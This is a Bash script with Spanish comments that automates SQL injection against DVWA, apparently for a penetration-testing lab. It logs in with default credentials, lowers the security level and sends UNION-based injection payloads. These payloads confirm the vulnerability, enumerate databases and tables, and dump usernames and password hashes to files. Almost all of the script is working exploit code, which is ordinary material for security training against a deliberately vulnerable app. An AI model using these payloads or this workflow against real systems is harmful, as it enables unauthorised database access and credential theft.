#!/bin/bash
#
# ejecutar-sqli-final.sh - SQL Injection WORKING VERSION
#

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"
source "$SCRIPT_DIR/utils.sh"

TARGET_URL="${TARGET_URL:-http://localhost}"
COOKIE_FILE="/tmp/dvwa_cookies_final.txt"

# ============================================================================
# OBTENER SESIÓN
# ============================================================================

get_dvwa_session() {
    info "Obteniendo sesión DVWA..."

    # Obtener token y login
    local login_page=$(curl -s -c "$COOKIE_FILE" "$TARGET_URL/login.php")
    local user_token=$(echo "$login_page" | grep -oP "user_token' value='\K[^']+")

    if [ -z "$user_token" ]; then
        error "No se pudo obtener CSRF token"
        return 1
    fi

    # Login
    curl -s -L -b "$COOKIE_FILE" -c "$COOKIE_FILE" \
        -d "username=admin&password=password&Login=Login&user_token=$user_token" \
        "$TARGET_URL/login.php" > /dev/null

    local PHPSESSID=$(grep PHPSESSID "$COOKIE_FILE" | awk '{print $7}')

    if [ -z "$PHPSESSID" ]; then
        error "No se pudo obtener sesión"
        return 1
    fi

    log "Sesión: $PHPSESSID"

    # Configurar security=low
    local security_page=$(curl -s -L -b "$COOKIE_FILE" "$TARGET_URL/security.php")
    local security_token=$(echo "$security_page" | grep -oP "user_token' value='\K[^']+")

    if [ -n "$security_token" ]; then
        curl -s -L -b "$COOKIE_FILE" -c "$COOKIE_FILE" \
            -d "security=low&seclev_submit=Submit&user_token=$security_token" \
            "$TARGET_URL/security.php" > /dev/null
        log "Security level: low"
    fi

    return 0
}

# ============================================================================
# EXPLOTACIÓN
# ============================================================================

sqli_exploit() {
    show_banner "SQL Injection Exploitation" "MITRE ATT&CK: T1213"

    info "Iniciando explotación de SQL Injection..."
    echo ""

    local sqli_dir="$PROJECT_ROOT/04-Explotacion/sqli-results"
    ensure_dir "$sqli_dir"

    # TEST 1: Vulnerabilidad
    separator
    echo -e "${BLUE}[TEST 1/4]${NC} Verificando vulnerabilidad"
    separator
    echo ""

    local test_url="$TARGET_URL/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit"
    local test_result=$(curl -s -L -b "$COOKIE_FILE" "$test_url")

    # Contar bloques <pre>
    local pre_count=$(echo "$test_result" | grep -c "<pre>")

    if [ "$pre_count" -gt 1 ]; then
        log "✓ SQL Injection VULNERABLE ($pre_count usuarios)"
        echo "$test_result" > "$sqli_dir/test-vulnerability.html"
    else
        error "Vulnerabilidad no detectada"
        return 1
    fi

    echo ""
    sleep 1

    # TEST 2: Bases de datos
    separator
    echo -e "${BLUE}[TEST 2/4]${NC} Enumerando bases de datos"
    separator
    echo ""

    local db_url="$TARGET_URL/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20NULL%2Cschema_name%20FROM%20information_schema.schemata--%20-&Submit=Submit"
    local db_result=$(curl -s -L -b "$COOKIE_FILE" "$db_url")

    log "Bases de datos:"
    echo "$db_result" | grep -oP 'Surname: \K[^<]+' | while read -r db; do
        echo "  • $db"
    done | tee "$sqli_dir/databases.txt"

    echo ""
    sleep 1

    # TEST 3: Tablas
    separator
    echo -e "${BLUE}[TEST 3/4]${NC} Enumerando tablas de 'dvwa'"
    separator
    echo ""

    local table_url="$TARGET_URL/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20NULL%2Ctable_name%20FROM%20information_schema.tables%20WHERE%20table_schema%3D%27dvwa%27--%20-&Submit=Submit"
    local table_result=$(curl -s -L -b "$COOKIE_FILE" "$table_url")

    log "Tablas:"
    echo "$table_result" | grep -oP 'Surname: \K[^<]+' | while read -r table; do
        echo "  • $table"
    done | tee "$sqli_dir/tables.txt"

    echo ""
    sleep 1

    # TEST 4: Usuarios
    separator
    echo -e "${BLUE}[TEST 4/4]${NC} Extrayendo usuarios y passwords"
    separator
    echo ""

    local user_url="$TARGET_URL/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user%2Cpassword%20FROM%20users--%20-&Submit=Submit"
    local user_result=$(curl -s -L -b "$COOKIE_FILE" "$user_url")

    echo "$user_result" > "$sqli_dir/users-dump-raw.html"

    local users_file="$sqli_dir/users-passwords.txt"
    {
        echo "# DVWA Users - SQL Injection Dump"
        echo "# Timestamp: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "# MITRE ATT&CK: T1213 (Data from Information Repositories)"
        echo ""
        echo "Usuario              | Hash MD5"
        echo "---------------------+----------------------------------"
    } > "$users_file"

    log "Usuarios extraídos:"
    echo ""

    # Extraer y formatear
    echo "$user_result" | grep -oP '<pre>.*?</pre>' | while read -r line; do
        firstname=$(echo "$line" | grep -oP 'First name: \K[^<]+')
        surname=$(echo "$line" | grep -oP 'Surname: \K[^<]+')
        if [ -n "$firstname" ] && [ -n "$surname" ]; then
            printf "%-20s | %s\n" "$firstname" "$surname"
        fi
    done | tee -a "$users_file"

    echo ""

    # Resumen
    separator
    log "✓ Explotación completada exitosamente"
    separator
    echo ""

    info "Resultados guardados:"
    echo "  📁 $sqli_dir/"
    echo "     • test-vulnerability.html"
    echo "     • databases.txt"
    echo "     • tables.txt"
    echo "     • users-passwords.txt ⭐"
    echo "     • users-dump-raw.html"
    echo ""

    # Captura evidencia
    info "Capturando evidencia..."
    bash "$SCRIPT_DIR/capture-evidence.sh" --screenshot exploit sqli "users-extraction-complete" T1213 2>/dev/null || true
    log "Screenshot capturado"

    echo ""
    separator
    info "Próximos pasos"
    separator
    echo ""
    echo "  1️⃣  Ver usuarios extraídos:"
    echo "     cat $sqli_dir/users-passwords.txt"
    echo ""
    echo "  2️⃣  Regenerar informe:"
    echo "     bash 07-Scripts/generar-informe.sh"
    echo ""
    echo "  3️⃣  Continuar con otras vulnerabilidades:"
    echo "     cd 04-Explotacion && cat README.md"
    echo ""

    return 0
}

# ============================================================================
# MAIN
# ============================================================================

main() {
    init_script "ejecutar-sqli-final.sh"

    echo ""
    info "Target: $TARGET_URL"
    echo ""

    if ! curl -s --max-time 5 "$TARGET_URL" > /dev/null 2>&1; then
        error "DVWA no accesible"
        exit 1
    fi

    if ! get_dvwa_session; then
        error "Error obteniendo sesión"
        exit 1
    fi

    echo ""

    if sqli_exploit; then
        echo ""
        log "🎉 SQL Injection exploitation completada exitosamente"
        finish_script "ejecutar-sqli-final.sh"
        exit 0
    else
        error "Explotación falló"
        exit 1
    fi
}

if [ "${BASH_SOURCE[0]}" == "${0}" ]; then
    main "$@"
fi
